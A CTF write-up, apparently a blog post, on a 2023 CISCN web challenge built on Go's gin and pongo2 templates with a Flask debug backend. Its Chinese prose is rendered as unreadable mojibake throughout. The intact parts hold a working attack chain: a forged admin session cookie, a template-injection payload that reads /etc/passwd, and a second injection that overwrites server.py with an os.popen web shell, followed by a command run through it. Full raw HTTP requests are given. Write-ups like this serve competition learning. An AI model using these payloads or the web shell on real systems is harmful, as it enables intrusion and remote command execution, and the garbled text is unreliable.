<p>ä½†æ˜¯å¼€å§‹æ²¡å•¥æ€è·¯ï¼Œä½†æ˜¯çœ‹åˆ°å¯åŠ¨<code>main.go</code>æ—¶å‘ç°æ˜¯å¯åŠ¨é»˜è®¤æ‰“å¼€debugæ¨¡å¼ï¼Œdebugæ¨¡å¼å°±ä¼šå°†ä¸€äº›ä»£ç å†…å®¹ä¹Ÿæ˜¾ç¤ºå‡ºæ¥ï¼Œè€Œä¸æ˜¯ç®€å•çš„400</p>
<p><img src="/post/2023CISCN%E5%88%9D%E8%B5%9B/image-20230615174941369.png" alt="image-20230615174941369"></p>
<p>æ‰€ä»¥çŒœæƒ³èƒ½ä¸èƒ½åˆ©ç”¨flaskä¸‹å‘é€é”™è¯¯è¯·æ±‚ï¼Œå¯¼è‡´ä»£ç æŠ¥é”™</p>
<p>äºæ˜¯æ„é€ </p>
<blockquote>
<p>url&#x2F;flask?name&#x3D;&#x2F;</p>
</blockquote>
<p><img src="/post/2023CISCN%E5%88%9D%E8%B5%9B/image-20230615181737962.png" alt="image-20230615181737962"></p>
<p>è¿™é‡Œå¾—åˆ°<code>/app/server.py</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> name + <span class="string">&quot; no ssti&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ç¡®å®æ˜¯æ‰“å¼€debug</p>
<p>åœ¨åº•ä¸‹è¿˜å¯ä»¥çœ‹åˆ°</p>
<p><img src="/post/2023CISCN%E5%88%9D%E8%B5%9B/image-20230615185901343.png" alt="image-20230615185901343"></p>
<p>ä½†æ˜¯å¹¶ä¸çŸ¥é“PINç æ˜¯å¤šå°‘ï¼Œæ‰€ä»¥ä¹Ÿä¸èƒ½åˆ©ç”¨è¿™ä¸ªåœ°æ–¹å®ç°äº¤äº’å¼shellï¼Œæœ¬æ¥æƒ³çœ‹çœ‹PINç èƒ½ä¸èƒ½åˆ©ç”¨SSTIè¯»å–æˆåŠŸï¼Œä½†æ˜¯SSTIä¹Ÿä¸è½»æ¾ï¼Œè§£å†³äº†SSTIé¢˜ç›®åº”è¯¥ä¹Ÿå°±å·²ç»è§£å‡ºäº†</p>
<h3 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h3><p>ä½†æ˜¯<code>admin</code>ä¸­ï¼Œéœ€è¦<code>session</code>ä¸­<code>name</code>å‚æ•°ä¸º<code>admin</code></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">    http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>è€Œ<code>session</code>ç”Ÿæˆéœ€è¦ç¯å¢ƒå˜é‡<code>SESSION_KEY</code>ï¼Œè€Œè¿™ä¸ªæ ¹æœ¬ä¸çŸ¥é“</p>
<p><code>session</code>çš„ç”Ÿæˆåœ¨indexä¸­ï¼Œå°è¯•ä¿®æ”¹æœ¬åœ°indexä¸­çš„ä»£ç </p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">   <span class="comment">//session.Values[&quot;name&quot;] = &quot;guest&quot;ï¼Œä¿®æ”¹guestä¸ºadmin</span></span><br><span class="line">   session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line">   err = session.Save(c.Request, c.Writer)</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±ä¼šå°†<code>session</code>ä¸­çš„<code>name</code>è®¾ä¸º<code>admin</code></p>
<p>ä½†æ˜¯æœ¬åœ°è¿™é‡Œ<code>SESSION_KEY</code>ä¸ºç©ºï¼Œæœ¬åœ°è¿è¡Œä»£ç åè·å¾—çš„<code>session-name</code></p>
<p>æˆ‘è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°æŠŠå…¶ä»£å…¥é¢˜ç›®ä¸­ä¹Ÿå¯ä»¥ï¼Œæ‰€ä»¥é¢˜ç›®ç¯å¢ƒä¸­<code>SESSION_KEY</code>ä¹Ÿæ˜¯ç©º</p>
<p><img src="/post/2023CISCN%E5%88%9D%E8%B5%9B/image-20230615171345355.png" alt="image-20230615171345355"></p>
<blockquote>
<p>MTY4NjgxODM4NHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXzwtTk7ay4mTCPFS8SyBfs6-bFy8R09M_ne8m4QhPXjxQ&#x3D;&#x3D;</p>
</blockquote>
<p>å†æ ¹æ®ä»£ç ä¸­æ¨¡æ¿æ³¨å…¥ç‚¹</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">name := c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">xssWaf := html.EscapeString(name)</span><br><span class="line">tpl, err := pongo2.FromString(<span class="string">&quot;Hello &quot;</span> + xssWaf + <span class="string">&quot;!&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">	<span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">out, err := tpl.Execute(pongo2.Context&#123;<span class="string">&quot;c&quot;</span>: c&#125;)</span><br></pre></td></tr></table></figure>

<p>ä¼šå°†<code>name</code>å‚æ•°è¿›è¡Œç¬¦åˆè½¬ä¹‰åï¼Œä¼ å…¥pongo2æ¨¡æ¿å¼•æ“ä¸­è¿›è¡Œæ¸²æŸ“ï¼Œå¯ä»¥ç®€å•æ„é€ ä¸€ä¸‹</p>
<p><img src="/post/2023CISCN%E5%88%9D%E8%B5%9B/image-20230615190608112.png" alt="image-20230615190608112"></p>
<p>å‘ç°ç¡®å®æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯<code>html.EscapeString(name)</code>æŠŠå¤§éƒ¨åˆ†å­—ç¬¦éƒ½è½¬ä¹‰äº†ï¼Œæ‰€ä»¥è¿›è¡Œsstiä¹Ÿä¸å®¹æ˜“</p>
<p>å»äº†è§£ä¸€ä¸‹Pongo2ï¼Œå‘ç°<code>Pongo2</code> åº“æ˜¯ä¸€ä¸ªå— <code>Django</code> æ¨¡æ¿å¼•æ“å¯å‘çš„ Go æ¨¡æ¿å¼•æ“ã€‚</p>
<p>æ‰€ä»¥èƒ½åœ¨<code>Django</code>è¿›è¡Œçš„æ³¨å…¥ï¼Œåœ¨<code>Pongo2</code>ä¸Šæœ‰æå¤§å¯èƒ½æ‰§è¡ŒæˆåŠŸ</p>
<h4 id="Pongo2"><a href="#Pongo2" class="headerlink" title="Pongo2"></a>Pongo2</h4><p>åœ¨<a href="https://pkg.go.dev/github.com/flosch/pongo2#section-readme">pongo2 package - github.com&#x2F;flosch&#x2F;pongo2 - Go Packages</a>è¿™é‡ŒæŸ¥çœ‹ï¼Œå‘ç°æœ‰å…¶å’Œ<code>Django 1.7</code>ç›¸ä¼¼çš„åœ°æ–¹</p>
<p><img src="/post/2023CISCN%E5%88%9D%E8%B5%9B/image-20230617173702284.png" alt="image-20230617173702284"></p>
<p>å°±å…ˆçœ‹çœ‹<code>Django 1.7</code>çš„æ ‡ç­¾</p>
<p><a href="https://django.readthedocs.io/en/1.7.x/ref/templates/builtins.html#ref-templates-builtins-tags">Built-in template tags and filters â€” Django 1.7.11 documentation</a></p>
<p>ä¸»è¦çœ‹ä¸‰ä¸ªï¼Œä¹Ÿå°±æ˜¯sstiå¸¸è§çš„rceï¼Œuploadfileï¼Œincludefile</p>
<h5 id="include"><a href="#include" class="headerlink" title="include"></a>include</h5><p><a href="https://django.readthedocs.io/en/1.7.x/ref/templates/builtins.html#include">Built-in template tags and filters â€” Django 1.7.11 documentation</a></p>
<p><img src="/post/2023CISCN%E5%88%9D%E8%B5%9B/image-20230617174133634.png" alt="image-20230617174133634"></p>
<blockquote>
<p>å‘ç°å¯ä»¥è¿›è¡Œ</p>
<p><code>&#123;%include "foo/bar.html" %&#125;</code>æ¥åŒ…å«æŸä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯å› ä¸ºä»£ç ä¸­å¯¹å•åŒå¼•å·è¿›è¡Œè½¬ä¹‰ï¼Œæ‰€ä»¥åªèƒ½åŒ…å«å˜é‡ï¼Œæ‰€ä»¥è¦æ„é€ ä¸€ä¸ªå¯æ§å˜é‡</p>
<p>è€Œä»£ç ä¸­å‘ç°ï¼Œåœ¨å„ä¸ªå‡½æ•°ä¸­åªæœ‰ä¸€ä¸ªå˜é‡å¯ä»¥æ§åˆ¶ï¼Œå°±æ˜¯<code>c</code>ï¼Œè€Œ<code>c</code>çš„å®šä¹‰æ˜¯<code>c *gin.Contex</code></p>
</blockquote>
<p>æ‰€ä»¥æŸ¥çœ‹<code>gin</code>æ–‡æ¡£ä¸­ï¼Œ<code>c</code>åº”è¯¥å¦‚ä½•æ§åˆ¶ï¼Œå®ç°ä¼ å‚</p>
<h5 id="gin-gonic-gin-Context"><a href="#gin-gonic-gin-Context" class="headerlink" title="gin-gonic&#x2F;gin#Context"></a>gin-gonic&#x2F;gin#Context</h5><p><a href="https://pkg.go.dev/github.com/gin-gonic/gin">gin package - github.com&#x2F;gin-gonic&#x2F;gin - Go Packages</a></p>
<p>å‘ç°<code>Context</code>æ˜¯ä¸€ä¸ªç»“æ„ä½“</p>
<p><img src="/post/2023CISCN%E5%88%9D%E8%B5%9B/image-20230617175336936.png" alt="image-20230617175336936"></p>
<p>æœ‰ä¸€ä¸ªhttpè¯·æ±‚åŒ…æ•°æ®çš„æŒ‡é’ˆï¼Œå¯ä»¥è·å¾—å…¶å†…å®¹</p>
<p>æŸ¥çœ‹è¿™ä¸ª<code>request</code>ä¸­å†…å®¹ï¼Œ</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Request <span class="keyword">struct</span> &#123;</span><br><span class="line">	Method <span class="type">string</span></span><br><span class="line"></span><br><span class="line">	URL *url.URL</span><br><span class="line"></span><br><span class="line">	Proto      <span class="type">string</span> <span class="comment">// &quot;HTTP/1.0&quot;</span></span><br><span class="line">	ProtoMajor <span class="type">int</span>    <span class="comment">// 1</span></span><br><span class="line">	ProtoMinor <span class="type">int</span>    <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line">	Header Header</span><br><span class="line"></span><br><span class="line">	Body io.ReadCloser</span><br><span class="line"></span><br><span class="line">	GetBody <span class="function"><span class="keyword">func</span><span class="params">()</span></span> (io.ReadCloser, <span class="type">error</span>)</span><br><span class="line"></span><br><span class="line">	ContentLength <span class="type">int64</span></span><br><span class="line"></span><br><span class="line">	TransferEncoding []<span class="type">string</span></span><br><span class="line"></span><br><span class="line">	Close <span class="type">bool</span></span><br><span class="line"></span><br><span class="line">	Host <span class="type">string</span></span><br><span class="line"></span><br><span class="line">	Form url.Values</span><br><span class="line"></span><br><span class="line">	PostForm url.Values</span><br><span class="line"></span><br><span class="line">	MultipartForm *multipart.Form</span><br><span class="line"></span><br><span class="line">	Trailer Header</span><br><span class="line"></span><br><span class="line">	RemoteAddr <span class="type">string</span></span><br><span class="line"></span><br><span class="line">	RequestURI <span class="type">string</span></span><br><span class="line"></span><br><span class="line">	TLS *tls.ConnectionState</span><br><span class="line"></span><br><span class="line">	Cancel &lt;-<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">	Response *Response</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ‰¾å¯»å…¶ä¸­å¯æ§å‚æ•°</p>
<blockquote>
<p>å‘ç°æœ‰</p>
<p>URL Header Host</p>
</blockquote>
<h5 id="SaveUploadedFile"><a href="#SaveUploadedFile" class="headerlink" title="SaveUploadedFile"></a><a href="https://github.com/gin-gonic/gin/blob/v1.9.1/context.go#L599">SaveUploadedFile</a></h5><p><img src="/post/2023CISCN%E5%88%9D%E8%B5%9B/image-20230617180158976.png" alt="image-20230617180158976"></p>
<p>éœ€è¦ä¼ ä¸¤ä¸ªå‚æ•°ï¼Œæ–‡ä»¶ï¼ˆformè¡¨å•ä¸­nameçš„å‚æ•°ï¼‰å’Œæ–‡ä»¶å…·ä½“ä½ç½®ï¼ˆpath&#x2F;æ–‡ä»¶åï¼‰</p>
<h4 id="è¯»æ–‡ä»¶x"><a href="#è¯»æ–‡ä»¶x" class="headerlink" title="è¯»æ–‡ä»¶x"></a>è¯»æ–‡ä»¶x</h4><p>å¼€å§‹çœ‹é©¬âœŒå‘çš„å¯ä»¥è¿›è¡Œè¯»å–æ–‡ä»¶è¿™ä¸ª</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">GET /admin?A&amp;name=&#123;%25include%20c.Request.Header[c.Request.URL.RawQuery|truncatechars:1]|join%25&#125; HTTP/1.1</span><br><span class="line">Host: xxx</span><br><span class="line">A: /etc/passwd</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: session-name=MTY4NjgxODM4NHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXzwtTk7ay4mTCPFS8SyBfs6-bFy8R09M_ne8m4QhPXjxQ==</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p><img src="/post/2023CISCN%E5%88%9D%E8%B5%9B/image-20230616160949211.png" alt="image-20230616160949211"></p>
<blockquote>
<p><code>&#123;%include c.Request.Header[c.Request.URL.RawQuery|truncatechars:1]|join%&#125;</code></p>
<p><code>%</code>éœ€è¦è¿›è¡Œ<code>url</code>ç¼–ç å‘åŒ…æ‰èƒ½è¢«è§£æï¼Œä¸ç„¶è¯»ä¸åˆ°<code>name</code>å‚æ•°</p>
<p><code>&#123;%include %&#125;</code></p>
<blockquote>
<p>è¿›è¡ŒåŒ…å«æ–‡ä»¶</p>
</blockquote>
<p><code>c</code></p>
<blockquote>
<p>åœ¨é™„ä»¶goä»£ç ä¸­å¯ä»¥çœ‹åˆ°<code>c *gin.Context</code>è¡¨ç¤ºä¸€ä¸ª Gin æ¡†æ¶å¤„ç† HTTP è¯·æ±‚çš„ä¸Šä¸‹æ–‡å¯¹è±¡ï¼Œå®ƒåŒ…å«äº† HTTP è¯·æ±‚å’Œå“åº”çš„æ‰€æœ‰ä¿¡æ¯ï¼Œæ‰€ä»¥<code>c</code>å°±æ˜¯ä¸€ä¸ªHTTPè¯·æ±‚å’Œå“åº”é›†åˆå¯¹è±¡</p>
</blockquote>
<p><code>c.Request.Header</code></p>
<blockquote>
<p>æ˜¯åªè¯»å–è¯·æ±‚å¤´å†…å®¹ï¼Œä¹Ÿå°±æ˜¯xx: xxx [å¦‚ï¼Œ<code>Accept-Encoding: gzip, deflate</code>]</p>
</blockquote>
<p><code>c.Request.URL.RawQuery</code></p>
<blockquote>
<p>è¯»å–URLå¤´ä¸­çš„å‚æ•°å€¼</p>
</blockquote>
<p><code>truncatechars:1</code></p>
<blockquote>
<p><code>truncatechars</code>æ˜¯ Flask æ¨¡æ¿å¼•æ“ä¸­çš„è¿‡æ»¤å™¨ï¼Œå®ƒçš„ä½œç”¨æ˜¯æˆªæ–­å­—ç¬¦ä¸²å¹¶è¿”å›æŒ‡å®šé•¿åº¦çš„å­å­—ç¬¦ä¸²ã€‚åœ¨è¿™ä¸ªè¿‡æ»¤å™¨ä¸­ï¼Œ<code>:1</code> è¡¨ç¤ºè¦æˆªæ–­çš„é•¿åº¦ä¸º 1ã€‚[å¦‚ä¸Šæ–‡ä¸­è¯·æ±‚è¡Œæ‰€ç¤ºï¼Œurlä¸­ç¬¬ä¸€ä¸ªå°±æ˜¯Aå‚æ•°]</p>
</blockquote>
<p><code>join</code></p>
<blockquote>
<p>å°†è·å–åˆ°çš„å€¼æ‹¼æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²å¹¶è¿”å›ã€‚</p>
</blockquote>
</blockquote>
<p>æˆ‘å°±ä¸€ç›´åœ¨è¯»æ–‡ä»¶ï¼Œæƒ³å»è¯»å–<code>machine_id</code>å’Œ<code>macåœ°å€</code>ç„¶åå¾—åˆ°<code>PINç </code>ï¼Œåˆ©ç”¨<code>debug</code>è¿›è¡Œäº¤äº’shellæ‰§è¡Œå‘½ä»¤</p>
<p><img src="/post/2023CISCN%E5%88%9D%E8%B5%9B/image-20230617143635583.png" alt="image-20230617143635583"></p>
<p><img src="/post/2023CISCN%E5%88%9D%E8%B5%9B/image-20230617142812454.png" alt="image-20230617142812454"></p>
<p><img src="/post/2023CISCN%E5%88%9D%E8%B5%9B/image-20230617142840187.png" alt="image-20230617142840187"></p>
<p>ä½†æ˜¯åé¢çœ‹åˆ°æµªâœŒå’Œå‡ ä½âœŒè¯´çš„ï¼Œä¼¼ä¹å¹¶ä¸å¯è¡Œ</p>
<p>å› ä¸º<code>pin rce</code>æ˜¯éœ€è¦è®¾ç½®<code>cookie</code>å¤´çš„ï¼Œè€Œä¸”<code>pin rce</code>ä¹Ÿæ²¡æ³•<code>crlf</code>ï¼Œæ‰€ä»¥é <code>ssti</code>è¯»æ–‡ä»¶ä¹Ÿæ²¡æ³•ç»§ç»­è¿›è¡Œ</p>
<h4 id="å†™æ–‡ä»¶âˆš"><a href="#å†™æ–‡ä»¶âˆš" class="headerlink" title="å†™æ–‡ä»¶âˆš"></a>å†™æ–‡ä»¶âˆš</h4><p>æ‰€ä»¥å°±æƒ³åŠæ³•å°è¯•å†™æ–‡ä»¶ï¼Œä½†æ˜¯ä¸æ¸…æ¥šç½‘ç«™ç›®å½•ä»¥åŠè¿è¡Œæ–‡ä»¶</p>
<p>å¯æ˜¯æ ¹æ®ä¹‹å‰<code>debug</code>å¾—åˆ°çš„<code>server.py</code>æ–‡ä»¶ï¼Œè¿™æ˜¯ç½‘ç«™è¿è¡Œçš„<code>py</code>æ–‡ä»¶ï¼Œåœ¨<code>/app/server.py</code>ä¸­</p>
<p>å°è¯•ä¸Šä¼ è¦†ç›–ï¼Œä½†æ˜¯ç”±äºæ˜¯<code>GET</code>è¯»å–å‚æ•°ï¼Œæ‰€ä»¥åœ¨<code>GET</code>æäº¤ä¸­ï¼Œ<u>æ·»åŠ ä¸Šä¼ æ–‡ä»¶è¡¨å•</u>ï¼Œå°†<code>server.py</code>ä¸­ä¿®æ”¹ï¼Œå¢åŠ è§£æ<code>name</code>å‚æ•°ï¼Œå®ç°å‘½ä»¤æ‰§è¡Œå¹¶æ˜¾ç¤ºæ‰§è¡Œå†…å®¹</p>
<blockquote>
<p>GETè¯·æ±‚ä¹Ÿå¯ä»¥æäº¤è¡¨å•ä¸Šä¼ æ–‡ä»¶</p>
</blockquote>
<p>æ ¹æ®<code>debug</code>ä»£ç ä¿®æ”¹å¾—åˆ°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    res = os.popen(name).read()</span><br><span class="line">    <span class="keyword">return</span> res + <span class="string">&quot; no ssti&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>äºæ˜¯æ„é€ GETè¯·æ±‚è¡Œï¼Œè¿›è¡Œæ–‡ä»¶ä¸Šä¼ è¦†ç›–</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">/admin?name=&#123;%<span class="built_in">set</span> <span class="attribute">form</span>=c.Query(c.HandlerName|first)%&#125;&#123;%<span class="built_in">set</span> <span class="attribute">path</span>=c.Query(c.HandlerName|last)%&#125;&#123;%<span class="built_in">set</span> <span class="attribute">file</span>=c.FormFile(form)%&#125;&#123;&#123;c.SaveUploadedFile(file,path)&#125;&#125;&amp;<span class="attribute">m</span>=file&amp;n=/app/server.py</span><br></pre></td></tr></table></figure>

<p>è§£æä¸€ä¸‹payloadï¼Œé¦–å…ˆå…ˆè¦å»å®˜æ–¹æ–‡æ¡£æŸ¥çœ‹<code>c *Context</code>çš„æ–¹æ³•å‘ç°æœ‰ä¸ªä¸Šä¼ æ–‡ä»¶çš„æ–¹æ³•<code>SaveUploadedFile</code></p>
<blockquote>
<p><code>&#123;%set form=c.Query(c.HandlerName|first)%&#125;&#123;%set path=c.Query(c.HandlerName|last)%&#125;&#123;%set file=c.FormFile(form)%&#125;&#123;&#123;c.SaveUploadedFile(file,path)&#125;&#125;&amp;m=file&amp;n=/app/server.py</code></p>
<p><code>&#123;% set %&#125;</code></p>
<blockquote>
<p>è¿›è¡Œè®¾ç½®å‚æ•°å€¼</p>
</blockquote>
<p><code>c.Query()</code></p>
<blockquote>
<p>æ˜¯è·å–urlä¸­å‚æ•°</p>
</blockquote>
<p><code>(c.HandlerName|first)</code>   </p>
<blockquote>
<p><code>c.HandlerName</code>æ˜¯è·å–å½“å‰çš„url  </p>
<p><code>first</code>æ˜¯æŒ‡å®šè·å–urlä¸­çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³<code>m</code>å‚æ•°å€¼<code>file</code></p>
<p><code>last</code>æ˜¯è·å–urlä¸­æœ€åä¸€ä¸ªå‚æ•°ï¼Œå³<code>n</code>å‚æ•°å€¼<code>/app/server.py</code></p>
</blockquote>
<p><code>form</code> <code>path</code></p>
<blockquote>
<p>å°±æ˜¯è¯»å–<code>url</code>å‚æ•°ï¼Œè¿›è¡Œèµ‹å€¼</p>
<p>äºæ˜¯</p>
<p><code>form=file</code></p>
<p><code>path=/app/server.py</code></p>
</blockquote>
<p><code>&#123;&#123;c.SaveUploadedFile(file,path)&#125;&#125;</code></p>
<blockquote>
<p>å°†ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åˆ°æŒ‡å®šçš„è·¯å¾„ä¸­ã€‚å…¶ä¸­ <code>file</code> å‚æ•°è¡¨ç¤ºè¦ä¿å­˜çš„æ–‡ä»¶ï¼Œ<code>path</code> å‚æ•°è¡¨ç¤ºè¦ä¿å­˜åˆ°çš„è·¯å¾„ã€‚</p>
</blockquote>
</blockquote>
<p>æ”¹åŒ…å‘é€</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin?name=%7B%25set%20form%3Dc.Query(c.HandlerName%7Cfirst)%25%7D%7B%25set%20path%3Dc.Query(c.HandlerName%7Clast)%25%7D%7B%25set%20file%3Dc.FormFile(form)%25%7D%7B%7Bc.SaveUploadedFile(file%2Cpath)%7D%7D&amp;m=file&amp;n=/app/server.py</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>47.92.233.116:12345</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryqwT9VdDXSgZPm0yn</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session-name=MTY4NjgxODM4NHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXzwtTk7ay4mTCPFS8SyBfs6-bFy8R09M_ne8m4QhPXjxQ==</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>562</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryqwT9VdDXSgZPm0yn</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file&quot;; filename=&quot;server.py&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: image/jpeg</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">import</span> os</span></span><br><span class="line"><span class="language-pgsql">app = Flask(__name__)</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">@app.route(<span class="string">&#x27;/&#x27;</span>)</span></span><br><span class="line"><span class="language-pgsql">def <span class="keyword">index</span>():</span></span><br><span class="line"><span class="language-pgsql">    <span class="type">name</span> = request.args[<span class="string">&#x27;name&#x27;</span>]</span></span><br><span class="line"><span class="language-pgsql">    res = os.popen(<span class="type">name</span>).<span class="keyword">read</span>()</span></span><br><span class="line"><span class="language-pgsql">    <span class="keyword">return</span> res + &quot; no ssti&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">if</span> __name__ == &quot;__main__&quot;:</span></span><br><span class="line"><span class="language-pgsql">    app.run(host=&quot;127.0.0.1&quot;, port=<span class="number">5000</span>, <span class="keyword">debug</span>=<span class="keyword">True</span>)</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryqwT9VdDXSgZPm0yn</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;submit&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">æäº¤</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryqwT9VdDXSgZPm0yn--</span></span></span><br></pre></td></tr></table></figure>

<p>*æ³¨æ„ï¼šéœ€è¦æ·»åŠ </p>
<blockquote>
<p><strong>Content-Type: multipart&#x2F;form-data; boundary&#x3D;â€”-WebKitFormBoundaryqwT9VdDXSgZPm0yn</strong></p>
<p>æ·»åŠ è¡¨å•æ–‡ä»¶ç±»å‹ï¼Œä»¥åŠåˆ†ç•Œç¬¦å·ï¼Œè¿™å°±æ˜¯GETæäº¤ä¸Šä¼ æ–‡ä»¶è¡¨å•å’ŒPOSTè¯·æ±‚æäº¤ä¸åŒä¹‹å¤„</p>
</blockquote>
<p>å†™å…¥æ–‡ä»¶</p>
<p><img src="/post/2023CISCN%E5%88%9D%E8%B5%9B/image-20230617170338372.png" alt="image-20230617170338372"></p>
<blockquote>
<p>&#x2F;flask?name&#x3D;?name&#x3D;ls${IFS}&#x2F;</p>
<p>*åŒä¸Šé¢å¯¹flaskä»£ç çš„åˆ†æ</p>
<p>å®ƒä¼šå°†nameåçš„å‚æ•°ç›´æ¥åŠ åˆ°<a href="http://127.0.0.1:5000/%E5%90%8E%E9%9D%A2%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%60server.py%60%E8%BF%90%E8%A1%8C%E7%9A%84%E7%AB%AF%E5%8F%A3">http://127.0.0.1:5000/åé¢ï¼Œä¹Ÿå°±æ˜¯`server.py`è¿è¡Œçš„ç«¯å£</a></p>
<p>æ‰€ä»¥è¿™é‡Œç›´æ¥å°†<code>?name=ls$&#123;IFS&#125;/</code>ä½œä¸º<code>flask</code>çš„<code>name</code>å‚æ•°çš„å€¼</p>
